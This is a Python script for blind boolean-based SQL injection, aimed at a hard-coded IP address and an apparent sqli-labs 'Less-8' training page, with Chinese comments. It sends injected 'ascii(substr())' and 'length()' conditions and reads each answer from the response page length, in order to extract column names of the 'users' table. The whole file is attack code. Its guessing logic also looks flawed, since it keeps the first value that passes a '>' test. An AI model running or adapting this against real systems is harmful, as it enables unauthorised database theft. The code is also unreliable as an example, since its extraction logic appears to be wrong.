import requests

result = ""
url_template = "http://43.247.91.228:84/Less-8/?id=2' and ascii(substr(({0}),{1},1))>{2} %23"
chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_,-.@&%/^!~"
url_length = "http://43.247.91.228:84/Less-8/?id=2' and length(({0})) >{1} %23"

def get_result_length(payload,value):
    for n in range(1,100):
        url = url_length.format(payload,n)
        response = requests.get(url)
        length = len(response.text)
        if length >value:
            print("……data length is :" + str(n))
            return  n

def get_db_name(data_length,payload,value):
    for i in range(1,data_length):
        for char in chars:
            url = url_template.format(payload,i,ord(char))
            response = requests.get(url)
            length = len(response.text)
            if length>value:         #根据返回长度的不同来判断字符正确与否
                global result
                result += char
                print("…… data is :"+ result)
                break

#自定义 sql注入语句 payload   如果用group_concat() 函数时 默认是分割符 为0
payload = "select group_concat(column_name) from information_schema.columns where table_name = 'users' "
# 根据正确访问时错误访问时返回页面文本长度的不同 来设置一个判断值
value = 706
data_length = get_result_length(payload,value)+1
get_db_name(data_length,payload,value)
print(result)